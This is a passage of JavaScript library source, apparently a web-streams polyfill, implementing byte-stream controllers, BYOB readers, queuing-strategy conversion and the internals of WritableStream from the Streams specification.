    const buffer = TransferArrayBuffer(view.buffer);
    // } catch (e) {
    //   readIntoRequest._errorSteps(e);
    //   return;
    // }
    const pullIntoDescriptor = {
        buffer,
        bufferByteLength: buffer.byteLength,
        byteOffset: view.byteOffset,
        byteLength: view.byteLength,
        bytesFilled: 0,
        elementSize,
        viewConstructor: ctor,
        readerType: 'byob'
    };
    if (controller._pendingPullIntos.length > 0) {
        controller._pendingPullIntos.push(pullIntoDescriptor);
        // No ReadableByteStreamControllerCallPullIfNeeded() call since:
        // - No change happens on desiredSize
        // - The source has already been notified of that there's at least 1 pending read(view)
        ReadableStreamAddReadIntoRequest(stream, readIntoRequest);
        return;
    }
    if (stream._state === 'closed') {
        const emptyView = new ctor(pullIntoDescriptor.buffer, pullIntoDescriptor.byteOffset, 0);
        readIntoRequest._closeSteps(emptyView);
        return;
    }
    if (controller._queueTotalSize > 0) {
        if (ReadableByteStreamControllerFillPullIntoDescriptorFromQueue(controller, pullIntoDescriptor)) {
            const filledView = ReadableByteStreamControllerConvertPullIntoDescriptor(pullIntoDescriptor);
            ReadableByteStreamControllerHandleQueueDrain(controller);
            readIntoRequest._chunkSteps(filledView);
            return;
        }
        if (controller._closeRequested) {
            const e = new TypeError('Insufficient bytes to fill elements in the given buffer');
            ReadableByteStreamControllerError(controller, e);
            readIntoRequest._errorSteps(e);
            return;
        }
    }
    controller._pendingPullIntos.push(pullIntoDescriptor);
    ReadableStreamAddReadIntoRequest(stream, readIntoRequest);
    ReadableByteStreamControllerCallPullIfNeeded(controller);
}
function ReadableByteStreamControllerRespondInClosedState(controller, firstDescriptor) {
    const stream = controller._controlledReadableByteStream;
    if (ReadableStreamHasBYOBReader(stream)) {
        while (ReadableStreamGetNumReadIntoRequests(stream) > 0) {
            const pullIntoDescriptor = ReadableByteStreamControllerShiftPendingPullInto(controller);
            ReadableByteStreamControllerCommitPullIntoDescriptor(stream, pullIntoDescriptor);
        }
    }
}
function ReadableByteStreamControllerRespondInReadableState(controller, bytesWritten, pullIntoDescriptor) {
    ReadableByteStreamControllerFillHeadPullIntoDescriptor(controller, bytesWritten, pullIntoDescriptor);
    if (pullIntoDescriptor.bytesFilled < pullIntoDescriptor.elementSize) {
        return;
    }
    ReadableByteStreamControllerShiftPendingPullInto(controller);
    const remainderSize = pullIntoDescriptor.bytesFilled % pullIntoDescriptor.elementSize;
    if (remainderSize > 0) {
        const end = pullIntoDescriptor.byteOffset + pullIntoDescriptor.bytesFilled;
        const remainder = ArrayBufferSlice(pullIntoDescriptor.buffer, end - remainderSize, end);
        ReadableByteStreamControllerEnqueueChunkToQueue(controller, remainder, 0, remainder.byteLength);
    }
    pullIntoDescriptor.bytesFilled -= remainderSize;
    ReadableByteStreamControllerCommitPullIntoDescriptor(controller._controlledReadableByteStream, pullIntoDescriptor);
    ReadableByteStreamControllerProcessPullIntoDescriptorsUsingQueue(controller);
}
function ReadableByteStreamControllerRespondInternal(controller, bytesWritten) {
    const firstDescriptor = controller._pendingPullIntos.peek();
    ReadableByteStreamControllerInvalidateBYOBRequest(controller);
    const state = controller._controlledReadableByteStream._state;
    if (state === 'closed') {
        ReadableByteStreamControllerRespondInClosedState(controller);
    }
    else {
        ReadableByteStreamControllerRespondInReadableState(controller, bytesWritten, firstDescriptor);
    }
    ReadableByteStreamControllerCallPullIfNeeded(controller);
}
function ReadableByteStreamControllerShiftPendingPullInto(controller) {
    const descriptor = controller._pendingPullIntos.shift();
    return descriptor;
}
function ReadableByteStreamControllerShouldCallPull(controller) {
    const stream = controller._controlledReadableByteStream;
    if (stream._state !== 'readable') {
        return false;
    }
    if (controller._closeRequested) {
        return false;
    }
    if (!controller._started) {
        return false;
    }
    if (ReadableStreamHasDefaultReader(stream) && ReadableStreamGetNumReadRequests(stream) > 0) {
        return true;
    }
    if (ReadableStreamHasBYOBReader(stream) && ReadableStreamGetNumReadIntoRequests(stream) > 0) {
        return true;
    }
    const desiredSize = ReadableByteStreamControllerGetDesiredSize(controller);
    if (desiredSize > 0) {
        return true;
    }
    return false;
}
function ReadableByteStreamControllerClearAlgorithms(controller) {
    controller._pullAlgorithm = undefined;
    controller._cancelAlgorithm = undefined;
}
// A client of ReadableByteStreamController may use these functions directly to bypass state check.
function ReadableByteStreamControllerClose(controller) {
    const stream = controller._controlledReadableByteStream;
    if (controller._closeRequested || stream._state !== 'readable') {
        return;
    }
    if (controller._queueTotalSize > 0) {
        controller._closeRequested = true;
        return;
    }
    if (controller._pendingPullIntos.length > 0) {
        const firstPendingPullInto = controller._pendingPullIntos.peek();
        if (firstPendingPullInto.bytesFilled > 0) {
            const e = new TypeError('Insufficient bytes to fill elements in the given buffer');
            ReadableByteStreamControllerError(controller, e);
            throw e;
        }
    }
    ReadableByteStreamControllerClearAlgorithms(controller);
    ReadableStreamClose(stream);
}
function ReadableByteStreamControllerEnqueue(controller, chunk) {
    const stream = controller._controlledReadableByteStream;
    if (controller._closeRequested || stream._state !== 'readable') {
        return;
    }
    const buffer = chunk.buffer;
    const byteOffset = chunk.byteOffset;
    const byteLength = chunk.byteLength;
    const transferredBuffer = TransferArrayBuffer(buffer);
    if (controller._pendingPullIntos.length > 0) {
        const firstPendingPullInto = controller._pendingPullIntos.peek();
        if (IsDetachedBuffer(firstPendingPullInto.buffer)) ;
        firstPendingPullInto.buffer = TransferArrayBuffer(firstPendingPullInto.buffer);
    }
    ReadableByteStreamControllerInvalidateBYOBRequest(controller);
    if (ReadableStreamHasDefaultReader(stream)) {
        if (ReadableStreamGetNumReadRequests(stream) === 0) {
            ReadableByteStreamControllerEnqueueChunkToQueue(controller, transferredBuffer, byteOffset, byteLength);
        }
        else {
            if (controller._pendingPullIntos.length > 0) {
                ReadableByteStreamControllerShiftPendingPullInto(controller);
            }
            const transferredView = new Uint8Array(transferredBuffer, byteOffset, byteLength);
            ReadableStreamFulfillReadRequest(stream, transferredView, false);
        }
    }
    else if (ReadableStreamHasBYOBReader(stream)) {
        // TODO: Ideally in this branch detaching should happen only if the buffer is not consumed fully.
        ReadableByteStreamControllerEnqueueChunkToQueue(controller, transferredBuffer, byteOffset, byteLength);
        ReadableByteStreamControllerProcessPullIntoDescriptorsUsingQueue(controller);
    }
    else {
        ReadableByteStreamControllerEnqueueChunkToQueue(controller, transferredBuffer, byteOffset, byteLength);
    }
    ReadableByteStreamControllerCallPullIfNeeded(controller);
}
function ReadableByteStreamControllerError(controller, e) {
    const stream = controller._controlledReadableByteStream;
    if (stream._state !== 'readable') {
        return;
    }
    ReadableByteStreamControllerClearPendingPullIntos(controller);
    ResetQueue(controller);
    ReadableByteStreamControllerClearAlgorithms(controller);
    ReadableStreamError(stream, e);
}
function ReadableByteStreamControllerGetBYOBRequest(controller) {
    if (controller._byobRequest === null && controller._pendingPullIntos.length > 0) {
        const firstDescriptor = controller._pendingPullIntos.peek();
        const view = new Uint8Array(firstDescriptor.buffer, firstDescriptor.byteOffset + firstDescriptor.bytesFilled, firstDescriptor.byteLength - firstDescriptor.bytesFilled);
        const byobRequest = Object.create(ReadableStreamBYOBRequest.prototype);
        SetUpReadableStreamBYOBRequest(byobRequest, controller, view);
        controller._byobRequest = byobRequest;
    }
    return controller._byobRequest;
}
function ReadableByteStreamControllerGetDesiredSize(controller) {
    const state = controller._controlledReadableByteStream._state;
    if (state === 'errored') {
        return null;
    }
    if (state === 'closed') {
        return 0;
    }
    return controller._strategyHWM - controller._queueTotalSize;
}
function ReadableByteStreamControllerRespond(controller, bytesWritten) {
    const firstDescriptor = controller._pendingPullIntos.peek();
    const state = controller._controlledReadableByteStream._state;
    if (state === 'closed') {
        if (bytesWritten !== 0) {
            throw new TypeError('bytesWritten must be 0 when calling respond() on a closed stream');
        }
    }
    else {
        if (bytesWritten === 0) {
            throw new TypeError('bytesWritten must be greater than 0 when calling respond() on a readable stream');
        }
        if (firstDescriptor.bytesFilled + bytesWritten > firstDescriptor.byteLength) {
            throw new RangeError('bytesWritten out of range');
        }
    }
    firstDescriptor.buffer = TransferArrayBuffer(firstDescriptor.buffer);
    ReadableByteStreamControllerRespondInternal(controller, bytesWritten);
}
function ReadableByteStreamControllerRespondWithNewView(controller, view) {
    const firstDescriptor = controller._pendingPullIntos.peek();
    const state = controller._controlledReadableByteStream._state;
    if (state === 'closed') {
        if (view.byteLength !== 0) {
            throw new TypeError('The view\'s length must be 0 when calling respondWithNewView() on a closed stream');
        }
    }
    else {
        if (view.byteLength === 0) {
            throw new TypeError('The view\'s length must be greater than 0 when calling respondWithNewView() on a readable stream');
        }
    }
    if (firstDescriptor.byteOffset + firstDescriptor.bytesFilled !== view.byteOffset) {
        throw new RangeError('The region specified by view does not match byobRequest');
    }
    if (firstDescriptor.bufferByteLength !== view.buffer.byteLength) {
        throw new RangeError('The buffer of view has different capacity than byobRequest');
    }
    if (firstDescriptor.bytesFilled + view.byteLength > firstDescriptor.byteLength) {
        throw new RangeError('The region specified by view is larger than byobRequest');
    }
    const viewByteLength = view.byteLength;
    firstDescriptor.buffer = TransferArrayBuffer(view.buffer);
    ReadableByteStreamControllerRespondInternal(controller, viewByteLength);
}
function SetUpReadableByteStreamController(stream, controller, startAlgorithm, pullAlgorithm, cancelAlgorithm, highWaterMark, autoAllocateChunkSize) {
    controller._controlledReadableByteStream = stream;
    controller._pullAgain = false;
    controller._pulling = false;
    controller._byobRequest = null;
    // Need to set the slots so that the assert doesn't fire. In the spec the slots already exist implicitly.
    controller._queue = controller._queueTotalSize = undefined;
    ResetQueue(controller);
    controller._closeRequested = false;
    controller._started = false;
    controller._strategyHWM = highWaterMark;
    controller._pullAlgorithm = pullAlgorithm;
    controller._cancelAlgorithm = cancelAlgorithm;
    controller._autoAllocateChunkSize = autoAllocateChunkSize;
    controller._pendingPullIntos = new SimpleQueue();
    stream._readableStreamController = controller;
    const startResult = startAlgorithm();
    uponPromise(promiseResolvedWith(startResult), () => {
        controller._started = true;
        ReadableByteStreamControllerCallPullIfNeeded(controller);
    }, r => {
        ReadableByteStreamControllerError(controller, r);
    });
}
function SetUpReadableByteStreamControllerFromUnderlyingSource(stream, underlyingByteSource, highWaterMark) {
    const controller = Object.create(ReadableByteStreamController.prototype);
    let startAlgorithm = () => undefined;
    let pullAlgorithm = () => promiseResolvedWith(undefined);
    let cancelAlgorithm = () => promiseResolvedWith(undefined);
    if (underlyingByteSource.start !== undefined) {
        startAlgorithm = () => underlyingByteSource.start(controller);
    }
    if (underlyingByteSource.pull !== undefined) {
        pullAlgorithm = () => underlyingByteSource.pull(controller);
    }
    if (underlyingByteSource.cancel !== undefined) {
        cancelAlgorithm = reason => underlyingByteSource.cancel(reason);
    }
    const autoAllocateChunkSize = underlyingByteSource.autoAllocateChunkSize;
    if (autoAllocateChunkSize === 0) {
        throw new TypeError('autoAllocateChunkSize must be greater than 0');
    }
    SetUpReadableByteStreamController(stream, controller, startAlgorithm, pullAlgorithm, cancelAlgorithm, highWaterMark, autoAllocateChunkSize);
}
function SetUpReadableStreamBYOBRequest(request, controller, view) {
    request._associatedReadableByteStreamController = controller;
    request._view = view;
}
// Helper functions for the ReadableStreamBYOBRequest.
function byobRequestBrandCheckException(name) {
    return new TypeError(`ReadableStreamBYOBRequest.prototype.${name} can only be used on a ReadableStreamBYOBRequest`);
}
// Helper functions for the ReadableByteStreamController.
function byteStreamControllerBrandCheckException(name) {
    return new TypeError(`ReadableByteStreamController.prototype.${name} can only be used on a ReadableByteStreamController`);
}

// Abstract operations for the ReadableStream.
function AcquireReadableStreamBYOBReader(stream) {
    return new ReadableStreamBYOBReader(stream);
}
// ReadableStream API exposed for controllers.
function ReadableStreamAddReadIntoRequest(stream, readIntoRequest) {
    stream._reader._readIntoRequests.push(readIntoRequest);
}
function ReadableStreamFulfillReadIntoRequest(stream, chunk, done) {
    const reader = stream._reader;
    const readIntoRequest = reader._readIntoRequests.shift();
    if (done) {
        readIntoRequest._closeSteps(chunk);
    }
    else {
        readIntoRequest._chunkSteps(chunk);
    }
}
function ReadableStreamGetNumReadIntoRequests(stream) {
    return stream._reader._readIntoRequests.length;
}
function ReadableStreamHasBYOBReader(stream) {
    const reader = stream._reader;
    if (reader === undefined) {
        return false;
    }
    if (!IsReadableStreamBYOBReader(reader)) {
        return false;
    }
    return true;
}
/**
 * A BYOB reader vended by a {@link ReadableStream}.
 *
 * @public
 */
class ReadableStreamBYOBReader {
    constructor(stream) {
        assertRequiredArgument(stream, 1, 'ReadableStreamBYOBReader');
        assertReadableStream(stream, 'First parameter');
        if (IsReadableStreamLocked(stream)) {
            throw new TypeError('This stream has already been locked for exclusive reading by another reader');
        }
        if (!IsReadableByteStreamController(stream._readableStreamController)) {
            throw new TypeError('Cannot construct a ReadableStreamBYOBReader for a stream not constructed with a byte ' +
                'source');
        }
        ReadableStreamReaderGenericInitialize(this, stream);
        this._readIntoRequests = new SimpleQueue();
    }
    /**
     * Returns a promise that will be fulfilled when the stream becomes closed, or rejected if the stream ever errors or
     * the reader's lock is released before the stream finishes closing.
     */
    get closed() {
        if (!IsReadableStreamBYOBReader(this)) {
            return promiseRejectedWith(byobReaderBrandCheckException('closed'));
        }
        return this._closedPromise;
    }
    /**
     * If the reader is active, behaves the same as {@link ReadableStream.cancel | stream.cancel(reason)}.
     */
    cancel(reason = undefined) {
        if (!IsReadableStreamBYOBReader(this)) {
            return promiseRejectedWith(byobReaderBrandCheckException('cancel'));
        }
        if (this._ownerReadableStream === undefined) {
            return promiseRejectedWith(readerLockException('cancel'));
        }
        return ReadableStreamReaderGenericCancel(this, reason);
    }
    /**
     * Attempts to reads bytes into view, and returns a promise resolved with the result.
     *
     * If reading a chunk causes the queue to become empty, more data will be pulled from the underlying source.
     */
    read(view) {
        if (!IsReadableStreamBYOBReader(this)) {
            return promiseRejectedWith(byobReaderBrandCheckException('read'));
        }
        if (!ArrayBuffer.isView(view)) {
            return promiseRejectedWith(new TypeError('view must be an array buffer view'));
        }
        if (view.byteLength === 0) {
            return promiseRejectedWith(new TypeError('view must have non-zero byteLength'));
        }
        if (view.buffer.byteLength === 0) {
            return promiseRejectedWith(new TypeError(`view's buffer must have non-zero byteLength`));
        }
        if (IsDetachedBuffer(view.buffer)) ;
        if (this._ownerReadableStream === undefined) {
            return promiseRejectedWith(readerLockException('read from'));
        }
        let resolvePromise;
        let rejectPromise;
        const promise = newPromise((resolve, reject) => {
            resolvePromise = resolve;
            rejectPromise = reject;
        });
        const readIntoRequest = {
            _chunkSteps: chunk => resolvePromise({ value: chunk, done: false }),
            _closeSteps: chunk => resolvePromise({ value: chunk, done: true }),
            _errorSteps: e => rejectPromise(e)
        };
        ReadableStreamBYOBReaderRead(this, view, readIntoRequest);
        return promise;
    }
    /**
     * Releases the reader's lock on the corresponding stream. After the lock is released, the reader is no longer active.
     * If the associated stream is errored when the lock is released, the reader will appear errored in the same way
     * from now on; otherwise, the reader will appear closed.
     *
     * A reader's lock cannot be released while it still has a pending read request, i.e., if a promise returned by
     * the reader's {@link ReadableStreamBYOBReader.read | read()} method has not yet been settled. Attempting to
     * do so will throw a `TypeError` and leave the reader locked to the stream.
     */
    releaseLock() {
        if (!IsReadableStreamBYOBReader(this)) {
            throw byobReaderBrandCheckException('releaseLock');
        }
        if (this._ownerReadableStream === undefined) {
            return;
        }
        if (this._readIntoRequests.length > 0) {
            throw new TypeError('Tried to release a reader lock when that reader has pending read() calls un-settled');
        }
        ReadableStreamReaderGenericRelease(this);
    }
}
Object.defineProperties(ReadableStreamBYOBReader.prototype, {
    cancel: { enumerable: true },
    read: { enumerable: true },
    releaseLock: { enumerable: true },
    closed: { enumerable: true }
});
// Abstract operations for the readers.
function IsReadableStreamBYOBReader(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_readIntoRequests')) {
        return false;
    }
    return x instanceof ReadableStreamBYOBReader;
}
function ReadableStreamBYOBReaderRead(reader, view, readIntoRequest) {
    const stream = reader._ownerReadableStream;
    stream._disturbed = true;
    if (stream._state === 'errored') {
        readIntoRequest._errorSteps(stream._storedError);
    }
    else {
        ReadableByteStreamControllerPullInto(stream._readableStreamController, view, readIntoRequest);
    }
}
// Helper functions for the ReadableStreamBYOBReader.
function byobReaderBrandCheckException(name) {
    return new TypeError(`ReadableStreamBYOBReader.prototype.${name} can only be used on a ReadableStreamBYOBReader`);
}

function ExtractHighWaterMark(strategy, defaultHWM) {
    const { highWaterMark } = strategy;
    if (highWaterMark === undefined) {
        return defaultHWM;
    }
    if (NumberIsNaN(highWaterMark) || highWaterMark < 0) {
        throw new RangeError('Invalid highWaterMark');
    }
    return highWaterMark;
}
function ExtractSizeAlgorithm(strategy) {
    const { size } = strategy;
    if (!size) {
        return () => 1;
    }
    return size;
}

function convertQueuingStrategy(init, context) {
    assertDictionary(init, context);
    const highWaterMark = init === null || init === void 0 ? void 0 : init.highWaterMark;
    const size = init === null || init === void 0 ? void 0 : init.size;
    return {
        highWaterMark: highWaterMark === undefined ? undefined : convertUnrestrictedDouble(highWaterMark),
        size: size === undefined ? undefined : convertQueuingStrategySize(size, `${context} has member 'size' that`)
    };
}
function convertQueuingStrategySize(fn, context) {
    assertFunction(fn, context);
    return chunk => convertUnrestrictedDouble(fn(chunk));
}

function convertUnderlyingSink(original, context) {
    assertDictionary(original, context);
    const abort = original === null || original === void 0 ? void 0 : original.abort;
    const close = original === null || original === void 0 ? void 0 : original.close;
    const start = original === null || original === void 0 ? void 0 : original.start;
    const type = original === null || original === void 0 ? void 0 : original.type;
    const write = original === null || original === void 0 ? void 0 : original.write;
    return {
        abort: abort === undefined ?
            undefined :
            convertUnderlyingSinkAbortCallback(abort, original, `${context} has member 'abort' that`),
        close: close === undefined ?
            undefined :
            convertUnderlyingSinkCloseCallback(close, original, `${context} has member 'close' that`),
        start: start === undefined ?
            undefined :
            convertUnderlyingSinkStartCallback(start, original, `${context} has member 'start' that`),
        write: write === undefined ?
            undefined :
            convertUnderlyingSinkWriteCallback(write, original, `${context} has member 'write' that`),
        type
    };
}
function convertUnderlyingSinkAbortCallback(fn, original, context) {
    assertFunction(fn, context);
    return (reason) => promiseCall(fn, original, [reason]);
}
function convertUnderlyingSinkCloseCallback(fn, original, context) {
    assertFunction(fn, context);
    return () => promiseCall(fn, original, []);
}
function convertUnderlyingSinkStartCallback(fn, original, context) {
    assertFunction(fn, context);
    return (controller) => reflectCall(fn, original, [controller]);
}
function convertUnderlyingSinkWriteCallback(fn, original, context) {
    assertFunction(fn, context);
    return (chunk, controller) => promiseCall(fn, original, [chunk, controller]);
}

function assertWritableStream(x, context) {
    if (!IsWritableStream(x)) {
        throw new TypeError(`${context} is not a WritableStream.`);
    }
}

function isAbortSignal(value) {
    if (typeof value !== 'object' || value === null) {
        return false;
    }
    try {
        return typeof value.aborted === 'boolean';
    }
    catch (_a) {
        // AbortSignal.prototype.aborted throws if its brand check fails
        return false;
    }
}

/**
 * A writable stream represents a destination for data, into which you can write.
 *
 * @public
 */
class WritableStream {
    constructor(rawUnderlyingSink = {}, rawStrategy = {}) {
        if (rawUnderlyingSink === undefined) {
            rawUnderlyingSink = null;
        }
        else {
            assertObject(rawUnderlyingSink, 'First parameter');
        }
        const strategy = convertQueuingStrategy(rawStrategy, 'Second parameter');
        const underlyingSink = convertUnderlyingSink(rawUnderlyingSink, 'First parameter');
        InitializeWritableStream(this);
        const type = underlyingSink.type;
        if (type !== undefined) {
            throw new RangeError('Invalid type is specified');
        }
        const sizeAlgorithm = ExtractSizeAlgorithm(strategy);
        const highWaterMark = ExtractHighWaterMark(strategy, 1);
        SetUpWritableStreamDefaultControllerFromUnderlyingSink(this, underlyingSink, highWaterMark, sizeAlgorithm);
    }
    /**
     * Returns whether or not the writable stream is locked to a writer.
     */
    get locked() {
        if (!IsWritableStream(this)) {
            throw streamBrandCheckException$2('locked');
        }
        return IsWritableStreamLocked(this);
    }
    /**
     * Aborts the stream, signaling that the producer can no longer successfully write to the stream and it is to be
     * immediately moved to an errored state, with any queued-up writes discarded. This will also execute any abort
     * mechanism of the underlying sink.
     *
     * The returned promise will fulfill if the stream shuts down successfully, or reject if the underlying sink signaled
     * that there was an error doing so. Additionally, it will reject with a `TypeError` (without attempting to cancel
     * the stream) if the stream is currently locked.
     */
    abort(reason = undefined) {
        if (!IsWritableStream(this)) {
            return promiseRejectedWith(streamBrandCheckException$2('abort'));
        }
        if (IsWritableStreamLocked(this)) {
            return promiseRejectedWith(new TypeError('Cannot abort a stream that already has a writer'));
        }
        return WritableStreamAbort(this, reason);
    }
    /**
     * Closes the stream. The underlying sink will finish processing any previously-written chunks, before invoking its
     * close behavior. During this time any further attempts to write will fail (without erroring the stream).
     *
     * The method returns a promise that will fulfill if all remaining chunks are successfully written and the stream
     * successfully closes, or rejects if an error is encountered during this process. Additionally, it will reject with
     * a `TypeError` (without attempting to cancel the stream) if the stream is currently locked.
     */
    close() {
        if (!IsWritableStream(this)) {
            return promiseRejectedWith(streamBrandCheckException$2('close'));
        }
        if (IsWritableStreamLocked(this)) {
            return promiseRejectedWith(new TypeError('Cannot close a stream that already has a writer'));
        }
        if (WritableStreamCloseQueuedOrInFlight(this)) {
            return promiseRejectedWith(new TypeError('Cannot close an already-closing stream'));
        }
        return WritableStreamClose(this);
    }
    /**
     * Creates a {@link WritableStreamDefaultWriter | writer} and locks the stream to the new writer. While the stream
     * is locked, no other writer can be acquired until this one is released.
     *
     * This functionality is especially useful for creating abstractions that desire the ability to write to a stream
     * without interruption or interleaving. By getting a writer for the stream, you can ensure nobody else can write at
     * the same time, which would cause the resulting written data to be unpredictable and probably useless.
     */
    getWriter() {
        if (!IsWritableStream(this)) {
            throw streamBrandCheckException$2('getWriter');
        }
        return AcquireWritableStreamDefaultWriter(this);
    }
}
Object.defineProperties(WritableStream.prototype, {
    abort: { enumerable: true },
    close: { enumerable: true },
    getWriter: { enumerable: true },
    locked: { enumerable: true }
});
// Abstract operations for the WritableStream.
function AcquireWritableStreamDefaultWriter(stream) {
    return new WritableStreamDefaultWriter(stream);
}
// Throws if and only if startAlgorithm throws.
function CreateWritableStream(startAlgorithm, writeAlgorithm, closeAlgorithm, abortAlgorithm, highWaterMark = 1, sizeAlgorithm = () => 1) {
    const stream = Object.create(WritableStream.prototype);
    InitializeWritableStream(stream);
    const controller = Object.create(WritableStreamDefaultController.prototype);
    SetUpWritableStreamDefaultController(stream, controller, startAlgorithm, writeAlgorithm, closeAlgorithm, abortAlgorithm, highWaterMark, sizeAlgorithm);
    return stream;
}
function InitializeWritableStream(stream) {
    stream._state = 'writable';
    // The error that will be reported by new method calls once the state becomes errored. Only set when [[state]] is
    // 'erroring' or 'errored'. May be set to an undefined value.
    stream._storedError = undefined;
    stream._writer = undefined;
    // Initialize to undefined first because the constructor of the controller checks this
    // variable to validate the caller.
    stream._writableStreamController = undefined;
    // This queue is placed here instead of the writer class in order to allow for passing a writer to the next data
    // producer without waiting for the queued writes to finish.
    stream._writeRequests = new SimpleQueue();
    // Write requests are removed from _writeRequests when write() is called on the underlying sink. This prevents
    // them from being erroneously rejected on error. If a write() call is in-flight, the request is stored here.
    stream._inFlightWriteRequest = undefined;
    // The promise that was returned from writer.close(). Stored here because it may be fulfilled after the writer
    // has been detached.
    stream._closeRequest = undefined;
    // Close request is removed from _closeRequest when close() is called on the underlying sink. This prevents it
    // from being erroneously rejected on error. If a close() call is in-flight, the request is stored here.
    stream._inFlightCloseRequest = undefined;
    // The promise that was returned from writer.abort(). This may also be fulfilled after the writer has detached.
    stream._pendingAbortRequest = undefined;
    // The backpressure signal set by the controller.
    stream._backpressure = false;
}
function IsWritableStream(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_writableStreamController')) {
        return false;
    }
    return x instanceof WritableStream;
}
function IsWritableStreamLocked(stream) {
    if (stream._writer === undefined) {
        return false;
    }
    return true;
}
function WritableStreamAbort(stream, reason) {
    var _a;
    if (stream._state === 'closed' || stream._state === 'errored') {
        return promiseResolvedWith(undefined);
    }
    stream._writableStreamController._abortReason = reason;
    (_a = stream._writableStreamController._abortController) === null || _a === void 0 ? void 0 : _a.abort();
    // TypeScript narrows the type of `stream._state` down to 'writable' | 'erroring',
    // but it doesn't know that signaling abort runs author code that might have changed the state.
    // Widen the type again by casting to WritableStreamState.
    const state = stream._state;
    if (state === 'closed' || state === 'errored') {
        return promiseResolvedWith(undefined);
    }
    if (stream._pendingAbortRequest !== undefined) {
        return stream._pendingAbortRequest._promise;
    }
    let wasAlreadyErroring = false;
    if (state === 'erroring') {
        wasAlreadyErroring = true;
        // reason will not be used, so don't keep a reference to it.
        reason = undefined;
    }
    const promise = newPromise((resolve, reject) => {
        stream._pendingAbortRequest = {
            _promise: undefined,
            _resolve: resolve,
            _reject: reject,
            _reason: reason,
            _wasAlreadyErroring: wasAlreadyErroring
        };
    });
    stream._pendingAbortRequest._promise = promise;
    if (!wasAlreadyErroring) {
        WritableStreamStartErroring(stream, reason);
    }
    return promise;
}
function WritableStreamClose(stream) {
    const state = stream._state;
    if (state === 'closed' || state === 'errored') {
        return promiseRejectedWith(new TypeError(`The stream (in ${state} state) is not in the writable state and cannot be closed`));
    }
    const promise = newPromise((resolve, reject) => {
        const closeRequest = {
            _resolve: resolve,
            _reject: reject
        };
        stream._closeRequest = closeRequest;
    });
    const writer = stream._writer;
    if (writer !== undefined && stream._backpressure && state === 'writable') {
        defaultWriterReadyPromiseResolve(writer);
    }
    WritableStreamDefaultControllerClose(stream._writableStreamController);
    return promise;
}
// WritableStream API exposed for controllers.
function WritableStreamAddWriteRequest(stream) {
    const promise = newPromise((resolve, reject) => {
        const writeRequest = {
            _resolve: resolve,
            _reject: reject
        };
        stream._writeRequests.push(writeRequest);
    });
    return promise;
}
function WritableStreamDealWithRejection(stream, error) {
    const state = stream._state;
    if (state === 'writable') {
        WritableStreamStartErroring(stream, error);
        return;
    }
    WritableStreamFinishErroring(stream);
}
function WritableStreamStartErroring(stream, reason) {
    const controller = stream._writableStreamController;
    stream._state = 'erroring';
    stream._storedError = reason;
    const writer = stream._writer;
    if (writer !== undefined) {
        WritableStreamDefaultWriterEnsureReadyPromiseRejected(writer, reason);
    }
    if (!WritableStreamHasOperationMarkedInFlight(stream) && controller._started) {
        WritableStreamFinishErroring(stream);
    }
}
function WritableStreamFinishErroring(stream) {
    stream._state = 'errored';
    stream._writableStreamController[ErrorSteps]();
    const storedError = stream._storedError;
    stream._writeRequests.forEach(writeRequest => {
        writeRequest._reject(storedError);
    });
    stream._writeRequests = new SimpleQueue();
    if (stream._pendingAbortRequest === undefined) {
        WritableStreamRejectCloseAndClosedPromiseIfNeeded(stream);
        return;
    }
    const abortRequest = stream._pendingAbortRequest;
    stream._pendingAbortRequest = undefined;
    if (abortRequest._wasAlreadyErroring) {
        abortRequest._reject(storedError);
        WritableStreamRejectCloseAndClosedPromiseIfNeeded(stream);
        return;
    }
    const promise = stream._writableStreamController[AbortSteps](abortRequest._reason);
    uponPromise(promise, () => {
        abortRequest._resolve();
        WritableStreamRejectCloseAndClosedPromiseIfNeeded(stream);
    }, (reason) => {
        abortRequest._reject(reason);
        WritableStreamRejectCloseAndClosedPromiseIfNeeded(stream);
    });
}
function WritableStreamFinishInFlightWrite(stream) {
    stream._inFlightWriteRequest._resolve(undefined);
    stream._inFlightWriteRequest = undefined;
}
function WritableStreamFinishInFlightWriteWithError(stream, error) {
    stream._inFlightWriteRequest._reject(error);
    stream._inFlightWriteRequest = undefined;
    WritableStreamDealWithRejection(stream, error);
}
function WritableStreamFinishInFlightClose(stream) {
    stream._inFlightCloseRequest._resolve(undefined);
    stream._inFlightCloseRequest = undefined;
    const state = stream._state;
    if (state === 'erroring') {
        // The error was too late to do anything, so it is ignored.
        stream._storedError = undefined;
        if (stream._pendingAbortRequest !== undefined) {
            stream._pendingAbortRequest._resolve();
            stream._pendingAbortRequest = undefined;
        }
    }
    stream._state = 'closed';
    const writer = stream._writer;
    if (writer !== undefined) {
        defaultWriterClosedPromiseResolve(writer);
    }
}
function WritableStreamFinishInFlightCloseWithError(stream, error) {
    stream._inFlightCloseRequest._reject(error);
    stream._inFlightCloseRequest = undefined;
    // Never execute sink abort() after sink close().
    if (stream._pendingAbortRequest !== undefined) {
        stream._pendingAbortRequest._reject(error);
        stream._pendingAbortRequest = undefined;
    }
    WritableStreamDealWithRejection(stream, error);
}
// TODO(ricea): Fix alphabetical order.
function WritableStreamCloseQueuedOrInFlight(stream) {
    if (stream._closeRequest === undefined && stream._inFlightCloseRequest === undefined) {
        return false;
    }
    return true;
}
function WritableStreamHasOperationMarkedInFlight(stream) {
    if (stream._inFlightWriteRequest === undefined && stream._inFlightCloseRequest === undefined) {
        return false;
    }
    return true;
}
function WritableStreamMarkCloseRequestInFlight(stream) {
    stream._inFlightCloseRequest = stream._closeRequest;
    stream._closeRequest = undefined;
}
function WritableStreamMarkFirstWriteRequestInFlight(stream) {
    stream._inFlightWriteRequest = stream._writeRequests.shift();
}
function WritableStreamRejectCloseAndClosedPromiseIfNeeded(stream) {
    if (stream._closeRequest !== undefined) {
        stream._closeRequest._reject(stream._storedError);
        stream._closeRequest = undefined;
    }
    const writer = stream._writer;
    if (writer !== undefined) {
        defaultWriterClosedPromiseReject(writer, stream._storedError);
    }
}
function WritableStreamUpdateBackpressure(stream, backpressure) {
    const writer = stream._writer;
    if (writer !== undefined && backpressure !== stream._backpressure) {
        if (backpressure) {
            defaultWriterReadyPromiseReset(writer);
        }
        else {
            defaultWriterReadyPromiseResolve(writer);
        }
    }
    stream._backpressure = backpressure;
}
/**
 * A default writer vended by a {@link WritableStream}.
 *
 * @public
 */
class WritableStreamDefaultWriter {
    constructor(stream) {
        assertRequiredArgument(stream, 1, 'WritableStreamDefaultWriter');
